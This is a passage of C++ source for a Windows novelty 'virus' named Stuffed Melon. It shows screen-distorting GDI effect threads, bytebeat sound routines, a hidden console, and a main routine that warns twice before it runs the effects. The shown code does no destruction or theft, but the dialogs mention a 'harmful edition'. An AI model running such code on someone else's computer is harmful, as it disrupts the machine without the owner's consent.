		HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hBitmap, w * h * 4, data);
		int v = 1 + rand() % 55;
		for (int i = 0; w * h > i; i++) {
			((BYTE*)(data + i))[r] = ((BYTE*)(data + i + v * p))[r] + 78;
			((BYTE*)(data + i))[g] = ((BYTE*)(data + i + v % p))[g] - 91;
			((BYTE*)(data + i))[b] = ((BYTE*)(data + i + v % p))[b] % 13;
		}
		SetBitmapBits(hBitmap, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		i %= 3;
	}
}
DWORD WINAPI shader2(LPVOID lpParam) {
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	while (true)
	{
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed += (x & y << i);
			rgbtriple[i].rgbtGreen += (x ^ y | i);
			rgbtriple[i].rgbtRed += (x * y + i);
		}
		BitBlt(desk, 0, 0, sw, sh, deskMem, 0, 0, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
	}
}
DWORD WINAPI shader3(LPVOID lpParam) {//credits to XUGE for the base
	HDC hdcScreen = GetDC(NULL);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);

	BITMAPINFO bmi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;

	//rgbScreen = {0};

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	while (true)
	{
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			INT x = i / w, y = i % w;
			rgbScreen[i].rgb = i - ((x - w / 2) * (x - w / 2) + (y - h / 2) * (y - h / 2) * (y - h / 2)) ^ RGB(GetRValue(Hue(239)), GetGValue(Hue(239)), GetBValue(Hue(239)));
		}
		Sleep(100);
		BitBlt(hdcScreen, 0, 0, w, h, hdcTempScreen, 0, 0, NOTSRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}
}
DWORD WINAPI shader4(LPVOID lpParam) {
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = -h;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biCompression = BI_RGB;
	RGBQUAD* pBits = NULL;
	srand(time(NULL));
	for (int i = 0;; ++i) {
		HDC hdc = GetDC(NULL);
		HDC hcdc = CreateCompatibleDC(hdc);
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, (void**)&pBits, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int y = 0; y < h; ++y) {
			for (int x = 0; x < w; ++x) {
				int index = x ^ y * w;
				BYTE originalRed = pBits[index].rgbRed;
				BYTE originalGreen = pBits[index].rgbGreen;
				BYTE originalBlue = pBits[index].rgbBlue;
				BYTE fractalRed = x | y ^ i * 4;
				BYTE fractalGreen = x & y * i * 4;
				BYTE fractalBlue = x ^ y + i * 4;
				pBits[index].rgbRed = static_cast<BYTE>(2 * originalRed + 0.5 * fractalRed);
				pBits[index].rgbGreen = static_cast<BYTE>(originalGreen + fractalGreen);
				pBits[index].rgbBlue = static_cast<BYTE>(0.5 * originalBlue + 2 * fractalBlue);
				pBits[index].rgbRed = static_cast<BYTE>(pBits[index].rgbRed * 2);
				pBits[index].rgbGreen = static_cast<BYTE>((pBits[index].rgbGreen));
				pBits[index].rgbBlue = static_cast<BYTE>(pBits[index].rgbBlue * 0.5);
				pBits[index].rgbRed = static_cast<BYTE>(fractalBlue + 0.5 * fractalGreen);
				pBits[index].rgbGreen = static_cast<BYTE>(fractalRed + 0.5 * fractalBlue);
				pBits[index].rgbBlue = static_cast<BYTE>(fractalGreen + 0.5 * fractalRed);
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdc);
		ReleaseDC(NULL, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc);
		DeleteDC(hdc);
	}
	return 0;
}
DWORD WINAPI shader5(LPVOID lpParam) {//credis to Excutioner0x00, but i modified it
	HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
	INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	BITMAPINFO bmpi = { 0 };
	PRGBQUAD rgbScreen = { 0 };
	bmpi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmpi.bmiHeader.biBitCount = 32;
	bmpi.bmiHeader.biPlanes = 1;
	bmpi.bmiHeader.biWidth = w;
	bmpi.bmiHeader.biHeight = h;
	HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmpi, NULL, (void**)&rgbScreen, NULL, NULL);
	RGBQUAD* rgbquad = NULL;
	HBITMAP bmp = CreateDIBSection(hdcScreen, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
	SelectObject(hdcMem, hbmTemp);
	while (true)
	{
		hdcScreen = GetDC(0);
		BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
		for (INT i = 0; i < w * h; i++) {
			INT x = i % w, y = i / w;
			int g = (rgbquad[i].rgbBlue + rgbquad[i].rgbGreen + rgbquad[i].rgbRed) / 3;
			rgbScreen[i].rgb = (int)((i ^ 4) + (i * 4) * cbrt(g * x >> y | x & y | x >> y));
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
	}
}
VOID WINAPI bytebeat1() {//callback from Polonium.exe one years ago
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t / 2 * (4 | 7 & t >> 13) >> (~t >> 11 & 1) & 127) + (t * 2 * (t >> 11 & t >> 13) * (~t >> 9 & 3) & 128));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (13 - (91 & -t >> 11)) * (78 + (24 & t >> 13)) >> (13 & t >> (91 + t))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {//neurozine.exe like, credits to the author of neurozine.exe!
	//I uses the similar in bytebeat9
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t & t >> 8) + (t & t >> 5) + (t + t << 4) + (t + t >> 7)) & 675));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(~(t >> 13) & (t >> 11 & (4 ? 5 : 14) + (t >> 13 & 91)) * t ^ (t >> 78) + (t - 91));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t / (sin(t & t >> 12) + 1)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(64 * sin((t ^ t >> 10) * t >> 8 | t >> 16) + 127);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(64 * sin(t * ((t / 401) ^ (t / 400))) + 128);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(129 * t % ((t >> 7) + 1)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t ^ t >> 8) * (t | t >> 5) & (t & t << 4) + (t + t >> 7)) / 674));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * t >> (((t >> 13) | (t % 13 * t >> 7)) & (8 * t >> 13))));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat11() {//credits to pankoza's isopropoxide.exe
	int nSamplesPerSec = 22000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t * (t & 11451 ? 41 : 91) / 9 | t >> 8) * (1 + (3 & t >> 11)) >> (3 & t >> 9) | t * (t & 7891 ? 13 : 66) * (3 + (3 & t >> (t & 2048 ? 334 : 14))) >> 1 + (3 & t >> 8) & ((t ^ 1) * t | t >> 4 | t >> 3)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat12() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 11 ^ t >> 4) % 5 * ((t >> 14 & 1 ^ t >> 91 & 9) + 8) * t % 99 + ((3 + (t >> 14 & 3) - (t >> 16 & 1)) / 3 * t % 99 & 64)));//pentoxideR.exe callback, credits to ShuiLongWXZoey!
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat13() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * (t & 16384 ? 6 : 5) * (2 * (1 & -t >> 6) + 4) >> (2 & t >> 8) & ~t >> 3 >> (t >> (t & 4096 ? 6 : 15)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
int main()
{
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxA(NULL, "Warning! This program is a computer virus that known as 'Stuffed Melon'. It may make your computer cannot work normally. Whether to run or not?\r\n\Please don't maliciously open this program on other people's or public computers! If you accidentally opened it, please click the \"No\" button to cancel the run. If you want to run it, please make sure you are running it on your own computer, or ensure that the virus on this computer is in a secure environment (such as a virtual machine, sandbox, etc.) and turn off all antivirus software. If you are running this program on other people's or public computers, please make sure you are running the harmless edition of this program, and then click the \"Yes\" button to continue.", "Stuffed Melon.exe--First warning", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookA);
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"This is the last warning!!!\r\n\Do you want to really run? After running, your computer may not work normally! If you run the harmful edition of this program on other people's or public computers, you will be responsible for any losses and legal liabilities caused by running this program! The writer of this computer virus(LambdaTechnology) isn't responsible!!!", L"Stuffed Melon.exe--LAST WARNING", MB_YESNO | MB_ICONWARNING) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{
			Sleep(5000);
			HANDLE thread0 = CreateThread(0, 0, curicons, 0, 0, 0);
			Sleep(5000);
			HANDLE thread1 = CreateThread(0, 0, shader1, 0, 0, 0);
			bytebeat1();
			TerminateThread(thread1, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread2_num1 = CreateThread(0, 0, sierpinskic, 0, 0, 0);
			HANDLE thread2_num2 = CreateThread(0, 0, specialpies, 0, 0, 0);
			HANDLE thread2_num3 = CreateThread(0, 0, fastup, 0, 0, 0);
			bytebeat2();
			TerminateThread(thread2_num1, 0);
			TerminateThread(thread2_num3, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread3 = CreateThread(0, 0, drawbytebeat1, 0, 0, 0);
			bytebeat3();
			TerminateThread(thread3, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread4_num1 = CreateThread(0, 0, shader2, 0, 0, 0);
			HANDLE thread4_num2 = CreateThread(0, 0, smalltriangles, 0, 0, 0);
			bytebeat4();
			TerminateThread(thread4_num1, 0);
			TerminateThread(thread4_num2, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread5_num1 = CreateThread(0, 0, shader_and_bitblt1, 0, 0, 0);
			HANDLE thread5_num2 = CreateThread(0, 0, textout1, 0, 0, 0);
			bytebeat5();
			TerminateThread(thread5_num1, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread6_num1 = CreateThread(0, 0, srcerase, 0, 0, 0);
			HANDLE thread6_num2 = CreateThread(0, 0, pieblt, 0, 0, 0);
			bytebeat6();
			TerminateThread(thread6_num1, 0);
			TerminateThread(thread6_num2, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread7 = CreateThread(0, 0, shader3, 0, 0, 0);
			bytebeat7();
			TerminateThread(thread7, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread8 = CreateThread(0, 0, stretchtunnel, 0, 0, 0);
			bytebeat8();
			TerminateThread(thread8, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread9_num1 = CreateThread(0, 0, payload9a, 0, 0, 0);
			HANDLE thread9_num2 = CreateThread(0, 0, payload9b, 0, 0, 0);
			HANDLE thread9_num3 = CreateThread(0, 0, filledstars, 0, 0, 0);
			HANDLE thread9_num4 = CreateThread(0, 0, linestars, 0, 0, 0);
			bytebeat9();
			TerminateThread(thread9_num1, 0);
			TerminateThread(thread9_num2, 0);
			TerminateThread(thread9_num3, 0);
			TerminateThread(thread9_num4, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread10 = CreateThread(0, 0, drawbytebeat2, 0, 0, 0);
			bytebeat10();
			TerminateThread(thread10, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread11 = CreateThread(0, 0, shader4, 0, 0, 0);
			bytebeat11();
			TerminateThread(thread11, 0);
			InvalidateRect(0, 0, 0);
			refreshscr(); 
			HANDLE thread12 = CreateThread(0, 0, shader5, 0, 0, 0);
			bytebeat12();
			TerminateThread(thread12, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			HANDLE thread13_num1 = CreateThread(0, 0, sierpinskitriangle, 0, 0, 0);
			//HANDLE thread13_num2 = CreateThread(0, 0, anything, 0, 0, 0);
			bytebeat13();
			TerminateThread(thread13_num1, 0);
			//TerminateThread(thread13_num2, 0);
			InvalidateRect(0, 0, 0);
			refreshscr();
			TerminateThread(thread0, 0);
			TerminateThread(thread2_num2, 0);
			TerminateThread(thread5_num2, 0);

		}
	}
	return 0;
}